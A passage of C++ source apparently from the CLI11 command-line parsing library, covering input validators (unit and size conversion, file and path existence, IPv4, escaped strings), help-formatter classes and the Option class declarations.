                if (it == mapping.end()) {
                    throw ValidationError(unit +
                        " unit not recognized. "
                        "Allowed values: " +
                        detail::generate_map(mapping, true));
                }

                if (!input.empty()) {
                    using CLI::detail::lexical_cast;
                    bool converted = lexical_cast(input, num);
                    if (!converted) {
                        throw ValidationError(std::string("Value ") + input + " could not be converted to " +
                            detail::type_name<Number>());
                    }
                    // perform safe multiplication
                    bool ok = detail::checked_multiply(num, it->second);
                    if (!ok) {
                        throw ValidationError(detail::to_string(num) + " multiplied by " + unit +
                            " factor would cause number overflow. Use smaller value.");
                    }
                }
                else {
                    num = static_cast<Number>(it->second);
                }

                input = detail::to_string(num);

                return {};
                };
        }

    private:
        /// Check that mapping contains valid units.
        /// Update mapping for CASE_INSENSITIVE mode.
        template <typename Number> static void validate_mapping(std::map<std::string, Number>& mapping, Options opts) {
            for (auto& kv : mapping) {
                if (kv.first.empty()) {
                    throw ValidationError("Unit must not be empty.");
                }
                if (!detail::isalpha(kv.first)) {
                    throw ValidationError("Unit must contain only letters.");
                }
            }

            // make all units lowercase if CASE_INSENSITIVE
            if (opts & CASE_INSENSITIVE) {
                std::map<std::string, Number> lower_mapping;
                for (auto& kv : mapping) {
                    auto s = detail::to_lower(kv.first);
                    if (lower_mapping.count(s)) {
                        throw ValidationError(std::string("Several matching lowercase unit representations are found: ") +
                            s);
                    }
                    lower_mapping[detail::to_lower(kv.first)] = kv.second;
                }
                mapping = std::move(lower_mapping);
            }
        }

        /// Generate description like this: NUMBER [UNIT]
        template <typename Number> static std::string generate_description(const std::string& name, Options opts) {
            std::stringstream out;
            out << detail::type_name<Number>() << ' ';
            if (opts & UNIT_REQUIRED) {
                out << name;
            }
            else {
                out << '[' << name << ']';
            }
            return out.str();
        }
    };

    inline AsNumberWithUnit::Options operator|(const AsNumberWithUnit::Options& a, const AsNumberWithUnit::Options& b) {
        return static_cast<AsNumberWithUnit::Options>(static_cast<int>(a) | static_cast<int>(b));
    }

    /// Converts a human-readable size string (with unit literal) to uin64_t size.
    /// Example:
    ///   "100" => 100
    ///   "1 b" => 100
    ///   "10Kb" => 10240 // you can configure this to be interpreted as kilobyte (*1000) or kibibyte (*1024)
    ///   "10 KB" => 10240
    ///   "10 kb" => 10240
    ///   "10 kib" => 10240 // *i, *ib are always interpreted as *bibyte (*1024)
    ///   "10kb" => 10240
    ///   "2 MB" => 2097152
    ///   "2 EiB" => 2^61 // Units up to exibyte are supported
    class AsSizeValue : public AsNumberWithUnit {
    public:
        using result_t = std::uint64_t;

        /// If kb_is_1000 is true,
        /// interpret 'kb', 'k' as 1000 and 'kib', 'ki' as 1024
        /// (same applies to higher order units as well).
        /// Otherwise, interpret all literals as factors of 1024.
        /// The first option is formally correct, but
        /// the second interpretation is more wide-spread
        /// (see https://en.wikipedia.org/wiki/Binary_prefix).
        explicit AsSizeValue(bool kb_is_1000);

    private:
        /// Get <size unit, factor> mapping
        static std::map<std::string, result_t> init_mapping(bool kb_is_1000);

        /// Cache calculated mapping
        static std::map<std::string, result_t> get_mapping(bool kb_is_1000);
    };

    namespace detail {
        /// Split a string into a program name and command line arguments
        /// the string is assumed to contain a file name followed by other arguments
        /// the return value contains is a pair with the first argument containing the program name and the second
        /// everything else.
        CLI11_INLINE std::pair<std::string, std::string> split_program_name(std::string commandline);

    }  // namespace detail
    /// @}




    CLI11_INLINE std::string Validator::operator()(std::string& str) const {
        std::string retstring;
        if (active_) {
            if (non_modifying_) {
                std::string value = str;
                retstring = func_(value);
            }
            else {
                retstring = func_(str);
            }
        }
        return retstring;
    }

    CLI11_NODISCARD CLI11_INLINE Validator Validator::description(std::string validator_desc) const {
        Validator newval(*this);
        newval.desc_function_ = [validator_desc]() { return validator_desc; };
        return newval;
    }

    CLI11_INLINE Validator Validator::operator&(const Validator& other) const {
        Validator newval;

        newval._merge_description(*this, other, " AND ");

        // Give references (will make a copy in lambda function)
        const std::function<std::string(std::string& filename)>& f1 = func_;
        const std::function<std::string(std::string& filename)>& f2 = other.func_;

        newval.func_ = [f1, f2](std::string& input) {
            std::string s1 = f1(input);
            std::string s2 = f2(input);
            if (!s1.empty() && !s2.empty())
                return std::string("(") + s1 + ") AND (" + s2 + ")";
            return s1 + s2;
            };

        newval.active_ = active_ && other.active_;
        newval.application_index_ = application_index_;
        return newval;
    }

    CLI11_INLINE Validator Validator::operator|(const Validator& other) const {
        Validator newval;

        newval._merge_description(*this, other, " OR ");

        // Give references (will make a copy in lambda function)
        const std::function<std::string(std::string&)>& f1 = func_;
        const std::function<std::string(std::string&)>& f2 = other.func_;

        newval.func_ = [f1, f2](std::string& input) {
            std::string s1 = f1(input);
            std::string s2 = f2(input);
            if (s1.empty() || s2.empty())
                return std::string();

            return std::string("(") + s1 + ") OR (" + s2 + ")";
            };
        newval.active_ = active_ && other.active_;
        newval.application_index_ = application_index_;
        return newval;
    }

    CLI11_INLINE Validator Validator::operator!() const {
        Validator newval;
        const std::function<std::string()>& dfunc1 = desc_function_;
        newval.desc_function_ = [dfunc1]() {
            auto str = dfunc1();
            return (!str.empty()) ? std::string("NOT ") + str : std::string{};
            };
        // Give references (will make a copy in lambda function)
        const std::function<std::string(std::string& res)>& f1 = func_;

        newval.func_ = [f1, dfunc1](std::string& test) -> std::string {
            std::string s1 = f1(test);
            if (s1.empty()) {
                return std::string("check ") + dfunc1() + " succeeded improperly";
            }
            return std::string{};
            };
        newval.active_ = active_;
        newval.application_index_ = application_index_;
        return newval;
    }

    CLI11_INLINE void
        Validator::_merge_description(const Validator& val1, const Validator& val2, const std::string& merger) {

        const std::function<std::string()>& dfunc1 = val1.desc_function_;
        const std::function<std::string()>& dfunc2 = val2.desc_function_;

        desc_function_ = [=]() {
            std::string f1 = dfunc1();
            std::string f2 = dfunc2();
            if ((f1.empty()) || (f2.empty())) {
                return f1 + f2;
            }
            return std::string(1, '(') + f1 + ')' + merger + '(' + f2 + ')';
            };
    }

    namespace detail {

#if defined CLI11_HAS_FILESYSTEM && CLI11_HAS_FILESYSTEM > 0
        CLI11_INLINE path_type check_path(const char* file) noexcept {
            std::error_code ec;
            auto stat = std::filesystem::status(to_path(file), ec);
            if (ec) {
                return path_type::nonexistent;
            }
            switch (stat.type()) {
            case std::filesystem::file_type::none:  // LCOV_EXCL_LINE
            case std::filesystem::file_type::not_found:
                return path_type::nonexistent;  // LCOV_EXCL_LINE
            case std::filesystem::file_type::directory:
                return path_type::directory;
            case std::filesystem::file_type::symlink:
            case std::filesystem::file_type::block:
            case std::filesystem::file_type::character:
            case std::filesystem::file_type::fifo:
            case std::filesystem::file_type::socket:
            case std::filesystem::file_type::regular:
            case std::filesystem::file_type::unknown:
            default:
                return path_type::file;
            }
        }
#else
        CLI11_INLINE path_type check_path(const char* file) noexcept {
#if defined(_MSC_VER)
            struct __stat64 buffer;
            if (_stat64(file, &buffer) == 0) {
                return ((buffer.st_mode & S_IFDIR) != 0) ? path_type::directory : path_type::file;
            }
#else
            struct stat buffer;
            if (stat(file, &buffer) == 0) {
                return ((buffer.st_mode & S_IFDIR) != 0) ? path_type::directory : path_type::file;
            }
#endif
            return path_type::nonexistent;
        }
#endif

        CLI11_INLINE ExistingFileValidator::ExistingFileValidator() : Validator("FILE") {
            func_ = [](std::string& filename) {
                auto path_result = check_path(filename.c_str());
                if (path_result == path_type::nonexistent) {
                    return "File does not exist: " + filename;
                }
                if (path_result == path_type::directory) {
                    return "File is actually a directory: " + filename;
                }
                return std::string();
                };
        }

        CLI11_INLINE ExistingDirectoryValidator::ExistingDirectoryValidator() : Validator("DIR") {
            func_ = [](std::string& filename) {
                auto path_result = check_path(filename.c_str());
                if (path_result == path_type::nonexistent) {
                    return "Directory does not exist: " + filename;
                }
                if (path_result == path_type::file) {
                    return "Directory is actually a file: " + filename;
                }
                return std::string();
                };
        }

        CLI11_INLINE ExistingPathValidator::ExistingPathValidator() : Validator("PATH(existing)") {
            func_ = [](std::string& filename) {
                auto path_result = check_path(filename.c_str());
                if (path_result == path_type::nonexistent) {
                    return "Path does not exist: " + filename;
                }
                return std::string();
                };
        }

        CLI11_INLINE NonexistentPathValidator::NonexistentPathValidator() : Validator("PATH(non-existing)") {
            func_ = [](std::string& filename) {
                auto path_result = check_path(filename.c_str());
                if (path_result != path_type::nonexistent) {
                    return "Path already exists: " + filename;
                }
                return std::string();
                };
        }

        CLI11_INLINE IPV4Validator::IPV4Validator() : Validator("IPV4") {
            func_ = [](std::string& ip_addr) {
                auto result = CLI::detail::split(ip_addr, '.');
                if (result.size() != 4) {
                    return std::string("Invalid IPV4 address must have four parts (") + ip_addr + ')';
                }
                int num = 0;
                for (const auto& var : result) {
                    using CLI::detail::lexical_cast;
                    bool retval = lexical_cast(var, num);
                    if (!retval) {
                        return std::string("Failed parsing number (") + var + ')';
                    }
                    if (num < 0 || num > 255) {
                        return std::string("Each IP number must be between 0 and 255 ") + var;
                    }
                }
                return std::string{};
                };
        }

        CLI11_INLINE EscapedStringTransformer::EscapedStringTransformer() {
            func_ = [](std::string& str) {
                try {
                    if (str.size() > 1 && (str.front() == '\"' || str.front() == '\'' || str.front() == '`') &&
                        str.front() == str.back()) {
                        process_quoted_string(str);
                    }
                    else if (str.find_first_of('\\') != std::string::npos) {
                        if (detail::is_binary_escaped_string(str)) {
                            str = detail::extract_binary_string(str);
                        }
                        else {
                            str = remove_escaped_characters(str);
                        }
                    }
                    return std::string{};
                }
                catch (const std::invalid_argument& ia) {
                    return std::string(ia.what());
                }
                };
        }
    }  // namespace detail

    CLI11_INLINE FileOnDefaultPath::FileOnDefaultPath(std::string default_path, bool enableErrorReturn)
        : Validator("FILE") {
        func_ = [default_path, enableErrorReturn](std::string& filename) {
            auto path_result = detail::check_path(filename.c_str());
            if (path_result == detail::path_type::nonexistent) {
                std::string test_file_path = default_path;
                if (default_path.back() != '/' && default_path.back() != '\\') {
                    // Add folder separator
                    test_file_path += '/';
                }
                test_file_path.append(filename);
                path_result = detail::check_path(test_file_path.c_str());
                if (path_result == detail::path_type::file) {
                    filename = test_file_path;
                }
                else {
                    if (enableErrorReturn) {
                        return "File does not exist: " + filename;
                    }
                }
            }
            return std::string{};
            };
    }

    CLI11_INLINE AsSizeValue::AsSizeValue(bool kb_is_1000) : AsNumberWithUnit(get_mapping(kb_is_1000)) {
        if (kb_is_1000) {
            description("SIZE [b, kb(=1000b), kib(=1024b), ...]");
        }
        else {
            description("SIZE [b, kb(=1024b), ...]");
        }
    }

    CLI11_INLINE std::map<std::string, AsSizeValue::result_t> AsSizeValue::init_mapping(bool kb_is_1000) {
        std::map<std::string, result_t> m;
        result_t k_factor = kb_is_1000 ? 1000 : 1024;
        result_t ki_factor = 1024;
        result_t k = 1;
        result_t ki = 1;
        m["b"] = 1;
        for (std::string p : {"k", "m", "g", "t", "p", "e"}) {
            k *= k_factor;
            ki *= ki_factor;
            m[p] = k;
            m[p + "b"] = k;
            m[p + "i"] = ki;
            m[p + "ib"] = ki;
        }
        return m;
    }

    CLI11_INLINE std::map<std::string, AsSizeValue::result_t> AsSizeValue::get_mapping(bool kb_is_1000) {
        if (kb_is_1000) {
            static auto m = init_mapping(true);
            return m;
        }
        static auto m = init_mapping(false);
        return m;
    }

    namespace detail {

        CLI11_INLINE std::pair<std::string, std::string> split_program_name(std::string commandline) {
            // try to determine the programName
            std::pair<std::string, std::string> vals;
            trim(commandline);
            auto esp = commandline.find_first_of(' ', 1);
            while (detail::check_path(commandline.substr(0, esp).c_str()) != path_type::file) {
                esp = commandline.find_first_of(' ', esp + 1);
                if (esp == std::string::npos) {
                    // if we have reached the end and haven't found a valid file just assume the first argument is the
                    // program name
                    if (commandline[0] == '"' || commandline[0] == '\'' || commandline[0] == '`') {
                        bool embeddedQuote = false;
                        auto keyChar = commandline[0];
                        auto end = commandline.find_first_of(keyChar, 1);
                        while ((end != std::string::npos) && (commandline[end - 1] == '\\')) {  // deal with escaped quotes
                            end = commandline.find_first_of(keyChar, end + 1);
                            embeddedQuote = true;
                        }
                        if (end != std::string::npos) {
                            vals.first = commandline.substr(1, end - 1);
                            esp = end + 1;
                            if (embeddedQuote) {
                                vals.first = find_and_replace(vals.first, std::string("\\") + keyChar, std::string(1, keyChar));
                            }
                        }
                        else {
                            esp = commandline.find_first_of(' ', 1);
                        }
                    }
                    else {
                        esp = commandline.find_first_of(' ', 1);
                    }

                    break;
                }
            }
            if (vals.first.empty()) {
                vals.first = commandline.substr(0, esp);
                rtrim(vals.first);
            }

            // strip the program name
            vals.second = (esp < commandline.length() - 1) ? commandline.substr(esp + 1) : std::string{};
            ltrim(vals.second);
            return vals;
        }

    }  // namespace detail
    /// @}




    class Option;
    class App;

    /// This enum signifies the type of help requested
    ///
    /// This is passed in by App; all user classes must accept this as
    /// the second argument.

    enum class AppFormatMode {
        Normal,  ///< The normal, detailed help
        All,     ///< A fully expanded help
        Sub,     ///< Used when printed as part of expanded subcommand
    };

    /// This is the minimum requirements to run a formatter.
    ///
    /// A user can subclass this is if they do not care at all
    /// about the structure in CLI::Formatter.
    class FormatterBase {
    protected:
        /// @name Options
        ///@{

        /// The width of the left column (options/flags/subcommands)
        std::size_t column_width_{ 30 };

        /// The width of the right column (description of options/flags/subcommands)
        std::size_t right_column_width_{ 65 };

        /// The width of the description paragraph at the top of help
        std::size_t description_paragraph_width_{ 80 };

        /// The width of the footer paragraph
        std::size_t footer_paragraph_width_{ 80 };

        /// @brief The required help printout labels (user changeable)
        /// Values are Needs, Excludes, etc.
        std::map<std::string, std::string> labels_{};

        ///@}
        /// @name Basic
        ///@{

    public:
        FormatterBase() = default;
        FormatterBase(const FormatterBase&) = default;
        FormatterBase(FormatterBase&&) = default;
        FormatterBase& operator=(const FormatterBase&) = default;
        FormatterBase& operator=(FormatterBase&&) = default;

        /// Adding a destructor in this form to work around bug in GCC 4.7
        virtual ~FormatterBase() noexcept {}  // NOLINT(modernize-use-equals-default)

        /// This is the key method that puts together help
        virtual std::string make_help(const App*, std::string, AppFormatMode) const = 0;

        ///@}
        /// @name Setters
        ///@{

        /// Set the "REQUIRED" label
        void label(std::string key, std::string val) { labels_[key] = val; }

        /// Set the left column width (options/flags/subcommands)
        void column_width(std::size_t val) { column_width_ = val; }

        /// Set the right column width (description of options/flags/subcommands)
        void right_column_width(std::size_t val) { right_column_width_ = val; }

        /// Set the description paragraph width at the top of help
        void description_paragraph_width(std::size_t val) { description_paragraph_width_ = val; }

        /// Set the footer paragraph width
        void footer_paragraph_width(std::size_t val) { footer_paragraph_width_ = val; }

        ///@}
        /// @name Getters
        ///@{

        /// Get the current value of a name (REQUIRED, etc.)
        CLI11_NODISCARD std::string get_label(std::string key) const {
            if (labels_.find(key) == labels_.end())
                return key;
            return labels_.at(key);
        }

        /// Get the current left column width (options/flags/subcommands)
        CLI11_NODISCARD std::size_t get_column_width() const { return column_width_; }

        /// Get the current right column width (description of options/flags/subcommands)
        CLI11_NODISCARD std::size_t get_right_column_width() const { return right_column_width_; }

        /// Get the current description paragraph width at the top of help
        CLI11_NODISCARD std::size_t get_description_paragraph_width() const { return description_paragraph_width_; }

        /// Get the current footer paragraph width
        CLI11_NODISCARD std::size_t get_footer_paragraph_width() const { return footer_paragraph_width_; }

        ///@}
    };

    /// This is a specialty override for lambda functions
    class FormatterLambda final : public FormatterBase {
        using funct_t = std::function<std::string(const App*, std::string, AppFormatMode)>;

        /// The lambda to hold and run
        funct_t lambda_;

    public:
        /// Create a FormatterLambda with a lambda function
        explicit FormatterLambda(funct_t funct) : lambda_(std::move(funct)) {}

        /// Adding a destructor (mostly to make GCC 4.7 happy)
        ~FormatterLambda() noexcept override {}  // NOLINT(modernize-use-equals-default)

        /// This will simply call the lambda function
        std::string make_help(const App* app, std::string name, AppFormatMode mode) const override {
            return lambda_(app, name, mode);
        }
    };

    /// This is the default Formatter for CLI11. It pretty prints help output, and is broken into quite a few
    /// overridable methods, to be highly customizable with minimal effort.
    class Formatter : public FormatterBase {
    public:
        Formatter() = default;
        Formatter(const Formatter&) = default;
        Formatter(Formatter&&) = default;
        Formatter& operator=(const Formatter&) = default;
        Formatter& operator=(Formatter&&) = default;

        /// @name Overridables
        ///@{

        /// This prints out a group of options with title
        ///
        CLI11_NODISCARD virtual std::string
            make_group(std::string group, bool is_positional, std::vector<const Option*> opts) const;

        /// This prints out just the positionals "group"
        virtual std::string make_positionals(const App* app) const;

        /// This prints out all the groups of options
        std::string make_groups(const App* app, AppFormatMode mode) const;

        /// This prints out all the subcommands
        virtual std::string make_subcommands(const App* app, AppFormatMode mode) const;

        /// This prints out a subcommand
        virtual std::string make_subcommand(const App* sub) const;

        /// This prints out a subcommand in help-all
        virtual std::string make_expanded(const App* sub, AppFormatMode mode) const;

        /// This prints out all the groups of options
        virtual std::string make_footer(const App* app) const;

        /// This displays the description line
        virtual std::string make_description(const App* app) const;

        /// This displays the usage line
        virtual std::string make_usage(const App* app, std::string name) const;

        /// This puts everything together
        std::string make_help(const App* app, std::string, AppFormatMode mode) const override;

        ///@}
        /// @name Options
        ///@{

        /// This prints out an option help line, either positional or optional form
        virtual std::string make_option(const Option*, bool) const;

        /// @brief This is the name part of an option, Default: left column
        virtual std::string make_option_name(const Option*, bool) const;

        /// @brief This is the options part of the name, Default: combined into left column
        virtual std::string make_option_opts(const Option*) const;

        /// @brief This is the description. Default: Right column, on new line if left column too large
        virtual std::string make_option_desc(const Option*) const;

        /// @brief This is used to print the name on the USAGE line
        virtual std::string make_option_usage(const Option* opt) const;

        ///@}
    };




    using results_t = std::vector<std::string>;
    /// callback function definition
    using callback_t = std::function<bool(const results_t&)>;

    class Option;
    class App;

    using Option_p = std::unique_ptr<Option>;
    /// Enumeration of the multiOption Policy selection
    enum class MultiOptionPolicy : char {
        Throw,      //!< Throw an error if any extra arguments were given
        TakeLast,   //!< take only the last Expected number of arguments
        TakeFirst,  //!< take only the first Expected number of arguments
        Join,       //!< merge all the arguments together into a single string via the delimiter character default('\n')
        TakeAll,    //!< just get all the passed argument regardless
        Sum,        //!< sum all the arguments together if numerical or concatenate directly without delimiter
        Reverse,    //!< take only the last Expected number of arguments in reverse order
    };

    /// This is the CRTP base class for Option and OptionDefaults. It was designed this way
    /// to share parts of the class; an OptionDefaults can copy to an Option.
    template <typename CRTP> class OptionBase {
        friend App;

    protected:
        /// The group membership
        std::string group_ = std::string("OPTIONS");

        /// True if this is a required option
        bool required_{ false };

        /// Ignore the case when matching (option, not value)
        bool ignore_case_{ false };

        /// Ignore underscores when matching (option, not value)
        bool ignore_underscore_{ false };

        /// Allow this option to be given in a configuration file
        bool configurable_{ true };

        /// Disable overriding flag values with '=value'
        bool disable_flag_override_{ false };

        /// Specify a delimiter character for vector arguments
        char delimiter_{ '\0' };

        /// Automatically capture default value
        bool always_capture_default_{ false };

        /// Policy for handling multiple arguments beyond the expected Max
        MultiOptionPolicy multi_option_policy_{ MultiOptionPolicy::Throw };

        /// Copy the contents to another similar class (one based on OptionBase)
        template <typename T> void copy_to(T* other) const;

    public:
        // setters

        /// Changes the group membership
        CRTP* group(const std::string& name) {
            if (!detail::valid_alias_name_string(name)) {
                throw IncorrectConstruction("Group names may not contain newlines or null characters");
            }
            group_ = name;
            return static_cast<CRTP*>(this);
        }

        /// Set the option as required
        CRTP* required(bool value = true) {
            required_ = value;
            return static_cast<CRTP*>(this);
        }

        /// Support Plumbum term
        CRTP* mandatory(bool value = true) { return required(value); }

        CRTP* always_capture_default(bool value = true) {
            always_capture_default_ = value;
            return static_cast<CRTP*>(this);
        }

        // Getters

        /// Get the group of this option
        CLI11_NODISCARD const std::string& get_group() const { return group_; }

        /// True if this is a required option
        CLI11_NODISCARD bool get_required() const { return required_; }

        /// The status of ignore case
        CLI11_NODISCARD bool get_ignore_case() const { return ignore_case_; }

        /// The status of ignore_underscore
        CLI11_NODISCARD bool get_ignore_underscore() const { return ignore_underscore_; }

        /// The status of configurable
        CLI11_NODISCARD bool get_configurable() const { return configurable_; }

        /// The status of configurable
        CLI11_NODISCARD bool get_disable_flag_override() const { return disable_flag_override_; }

        /// Get the current delimiter char
        CLI11_NODISCARD char get_delimiter() const { return delimiter_; }

        /// Return true if this will automatically capture the default value for help printing
        CLI11_NODISCARD bool get_always_capture_default() const { return always_capture_default_; }

        /// The status of the multi option policy
        CLI11_NODISCARD MultiOptionPolicy get_multi_option_policy() const { return multi_option_policy_; }

        // Shortcuts for multi option policy

        /// Set the multi option policy to take last
        CRTP* take_last() {
            auto* self = static_cast<CRTP*>(this);
            self->multi_option_policy(MultiOptionPolicy::TakeLast);
            return self;
        }

        /// Set the multi option policy to take last
        CRTP* take_first() {
            auto* self = static_cast<CRTP*>(this);
            self->multi_option_policy(MultiOptionPolicy::TakeFirst);
            return self;
        }

        /// Set the multi option policy to take all arguments
        CRTP* take_all() {
            auto self = static_cast<CRTP*>(this);
            self->multi_option_policy(MultiOptionPolicy::TakeAll);
            return self;
        }

        /// Set the multi option policy to join
        CRTP* join() {
            auto* self = static_cast<CRTP*>(this);
            self->multi_option_policy(MultiOptionPolicy::Join);
            return self;
        }

        /// Set the multi option policy to join with a specific delimiter
        CRTP* join(char delim) {
            auto self = static_cast<CRTP*>(this);
            self->delimiter_ = delim;
            self->multi_option_policy(MultiOptionPolicy::Join);
            return self;
        }

        /// Allow in a configuration file
        CRTP* configurable(bool value = true) {
            configurable_ = value;
            return static_cast<CRTP*>(this);
        }

        /// Allow in a configuration file
        CRTP* delimiter(char value = '\0') {
            delimiter_ = value;
            return static_cast<CRTP*>(this);
        }
    };

    /// This is a version of OptionBase that only supports setting values,
    /// for defaults. It is stored as the default option in an App.
    class OptionDefaults : public OptionBase<OptionDefaults> {
    public:
        OptionDefaults() = default;

        // Methods here need a different implementation if they are Option vs. OptionDefault

        /// Take the last argument if given multiple times
        OptionDefaults* multi_option_policy(MultiOptionPolicy value = MultiOptionPolicy::Throw) {
            multi_option_policy_ = value;
            return this;
        }

        /// Ignore the case of the option name
        OptionDefaults* ignore_case(bool value = true) {
            ignore_case_ = value;
            return this;
        }

        /// Ignore underscores in the option name
        OptionDefaults* ignore_underscore(bool value = true) {
            ignore_underscore_ = value;
            return this;
        }

        /// Disable overriding flag values with an '=<value>' segment
        OptionDefaults* disable_flag_override(bool value = true) {
            disable_flag_override_ = value;
            return this;
        }

        /// set a delimiter character to split up single arguments to treat as multiple inputs
        OptionDefaults* delimiter(char value = '\0') {
            delimiter_ = value;
            return this;
        }
    };

    class Option : public OptionBase<Option> {
        friend App;

    protected:
        /// @name Names
        ///@{

        /// A list of the short names (`-a`) without the leading dashes
        std::vector<std::string> snames_{};

        /// A list of the long names (`--long`) without the leading dashes
        std::vector<std::string> lnames_{};

        /// A list of the flag names with the appropriate default value, the first part of the pair should be duplicates of
        /// what is in snames or lnames but will trigger a particular response on a flag
        std::vector<std::pair<std::string, std::string>> default_flag_values_{};

        /// a list of flag names with specified default values;
        std::vector<std::string> fnames_{};

        /// A positional name
        std::string pname_{};

        /// If given, check the environment for this option
        std::string envname_{};

        ///@}
        /// @name Help
        ///@{

        /// The description for help strings
        std::string description_{};

        /// A human readable default value, either manually set, captured, or captured by default
        std::string default_str_{};

        /// If given, replace the text that describes the option type and usage in the help text
        std::string option_text_{};

        /// A human readable type value, set when App creates this
        ///
        /// This is a lambda function so "types" can be dynamic, such as when a set prints its contents.
        std::function<std::string()> type_name_{ []() { return std::string(); } };

        /// Run this function to capture a default (ignore if empty)
        std::function<std::string()> default_function_{};

        ///@}
        /// @name Configuration
        ///@{

        /// The number of arguments that make up one option. max is the nominal type size, min is the minimum number of
        /// strings
        int type_size_max_{ 1 };
        /// The minimum number of arguments an option should be expecting
        int type_size_min_{ 1 };

        /// The minimum number of expected values
        int expected_min_{ 1 };
        /// The maximum number of expected values
        int expected_max_{ 1 };

        /// A list of Validators to run on each value parsed
        std::vector<Validator> validators_{};

        /// A list of options that are required with this option
        std::set<Option*> needs_{};

        /// A list of options that are excluded with this option
        std::set<Option*> excludes_{};

        ///@}
        /// @name Other
        ///@{

        /// link back up to the parent App for fallthrough
        App* parent_{ nullptr };

        /// Options store a callback to do all the work
        callback_t callback_{};

        ///@}
        /// @name Parsing results
        ///@{

        /// complete Results of parsing
        results_t results_{};
        /// results after reduction
        results_t proc_results_{};
        /// enumeration for the option state machine
        enum class option_state : char {
            parsing = 0,       //!< The option is currently collecting parsed results
            validated = 2,     //!< the results have been validated
            reduced = 4,       //!< a subset of results has been generated
            callback_run = 6,  //!< the callback has been executed
        };
        /// Whether the callback has run (needed for INI parsing)
        option_state current_option_state_{ option_state::parsing };
        /// Specify that extra args beyond type_size_max should be allowed
        bool allow_extra_args_{ false };
        /// Specify that the option should act like a flag vs regular option
        bool flag_like_{ false };
        /// Control option to run the callback to set the default
        bool run_callback_for_default_{ false };
        /// flag indicating a separator needs to be injected after each argument call
        bool inject_separator_{ false };
        /// flag indicating that the option should trigger the validation and callback chain on each result when loaded
        bool trigger_on_result_{ false };
        /// flag indicating that the option should force the callback regardless if any results present
        bool force_callback_{ false };
        ///@}

        /// Making an option by hand is not defined, it must be made by the App class
        Option(std::string option_name,
            std::string option_description,
            callback_t callback,
            App* parent,
            bool allow_non_standard = false)
            : description_(std::move(option_description)), parent_(parent), callback_(std::move(callback)) {
            std::tie(snames_, lnames_, pname_) = detail::get_names(detail::split_names(option_name), allow_non_standard);
        }

    public:
        /// @name Basic
        ///@{

        Option(const Option&) = delete;
        Option& operator=(const Option&) = delete;

        /// Count the total number of times an option was passed
        CLI11_NODISCARD std::size_t count() const { return results_.size(); }

        /// True if the option was not passed
        CLI11_NODISCARD bool empty() const { return results_.empty(); }

        /// This bool operator returns true if any arguments were passed or the option callback is forced
        explicit operator bool() const { return !empty() || force_callback_; }

        /// Clear the parsed results (mostly for testing)
        void clear() {
            results_.clear();
            current_option_state_ = option_state::parsing;
        }

        ///@}
        /// @name Setting options
        ///@{

        /// Set the number of expected arguments
        Option* expected(int value);

        /// Set the range of expected arguments
        Option* expected(int value_min, int value_max);

        /// Set the value of allow_extra_args which allows extra value arguments on the flag or option to be included
        /// with each instance
        Option* allow_extra_args(bool value = true) {
            allow_extra_args_ = value;
            return this;
        }
        /// Get the current value of allow extra args
        CLI11_NODISCARD bool get_allow_extra_args() const { return allow_extra_args_; }
        /// Set the value of trigger_on_parse which specifies that the option callback should be triggered on every parse
        Option* trigger_on_parse(bool value = true) {
            trigger_on_result_ = value;
            return this;
        }
        /// The status of trigger on parse
        CLI11_NODISCARD bool get_trigger_on_parse() const { return trigger_on_result_; }

        /// Set the value of force_callback
        Option* force_callback(bool value = true) {
            force_callback_ = value;
            return this;
        }
        /// The status of force_callback
        CLI11_NODISCARD bool get_force_callback() const { return force_callback_; }

        /// Set the value of run_callback_for_default which controls whether the callback function should be called to set
        /// the default This is controlled automatically but could be manipulated by the user.
        Option* run_callback_for_default(bool value = true) {
            run_callback_for_default_ = value;
            return this;
        }
        /// Get the current value of run_callback_for_default
        CLI11_NODISCARD bool get_run_callback_for_default() const { return run_callback_for_default_; }

        /// Adds a Validator with a built in type name
        Option* check(Validator validator, const std::string& validator_name = "");

        /// Adds a Validator. Takes a const string& and returns an error message (empty if conversion/check is okay).
        Option* check(std::function<std::string(const std::string&)> Validator,
            std::string Validator_description = "",
            std::string Validator_name = "");

        /// Adds a transforming Validator with a built in type name
        Option* transform(Validator Validator, const std::string& Validator_name = "");

        /// Adds a Validator-like function that can change result
        Option* transform(const std::function<std::string(std::string)>& func,
            std::string transform_description = "",
            std::string transform_name = "");

        /// Adds a user supplied function to run on each item passed in (communicate though lambda capture)
        Option* each(const std::function<void(std::string)>& func);

        /// Get a named Validator
        Validator* get_validator(const std::string& Validator_name = "");

        /// Get a Validator by index NOTE: this may not be the order of definition
        Validator* get_validator(int index);

        /// Sets required options
        Option* needs(Option* opt) {
            if (opt != this) {
                needs_.insert(opt);
            }
            return this;
        }

        /// Can find a string if needed
        template <typename T = App> Option* needs(std::string opt_name) {
            auto opt = static_cast<T*>(parent_)->get_option_no_throw(opt_name);
            if (opt == nullptr) {
                throw IncorrectConstruction::MissingOption(opt_name);
            }
            return needs(opt);
        }

        /// Any number supported, any mix of string and Opt
        template <typename A, typename B, typename... ARG> Option* needs(A opt, B opt1, ARG... args) {
            needs(opt);
            return needs(opt1, args...);  // NOLINT(readability-suspicious-call-argument)
        }

        /// Remove needs link from an option. Returns true if the option really was in the needs list.
        bool remove_needs(Option* opt);

        /// Sets excluded options
        Option* excludes(Option* opt);

        /// Can find a string if needed
        template <typename T = App> Option* excludes(std::string opt_name) {
            auto opt = static_cast<T*>(parent_)->get_option_no_throw(opt_name);
            if (opt == nullptr) {
                throw IncorrectConstruction::MissingOption(opt_name);
            }
            return excludes(opt);
        }

        /// Any number supported, any mix of string and Opt
        template <typename A, typename B, typename... ARG> Option* excludes(A opt, B opt1, ARG... args) {
            excludes(opt);
            return excludes(opt1, args...);
        }

        /// Remove needs link from an option. Returns true if the option really was in the needs list.
        bool remove_excludes(Option* opt);

        /// Sets environment variable to read if no option given
        Option* envname(std::string name) {
            envname_ = std::move(name);
            return this;
        }

        /// Ignore case
        ///
        /// The template hides the fact that we don't have the definition of App yet.
        /// You are never expected to add an argument to the template here.
        template <typename T = App> Option* ignore_case(bool value = true);

        /// Ignore underscores in the option names
        ///
        /// The template hides the fact that we don't have the definition of App yet.
        /// You are never expected to add an argument to the template here.
        template <typename T = App> Option* ignore_underscore(bool value = true);

        /// Take the last argument if given multiple times (or another policy)
        Option* multi_option_policy(MultiOptionPolicy value = MultiOptionPolicy::Throw);

        /// Disable flag overrides values, e.g. --flag=<value> is not allowed
        Option* disable_flag_override(bool value = true) {
            disable_flag_override_ = value;
            return this;
        }
        ///@}
        /// @name Accessors
        ///@{

        /// The number of arguments the option expects
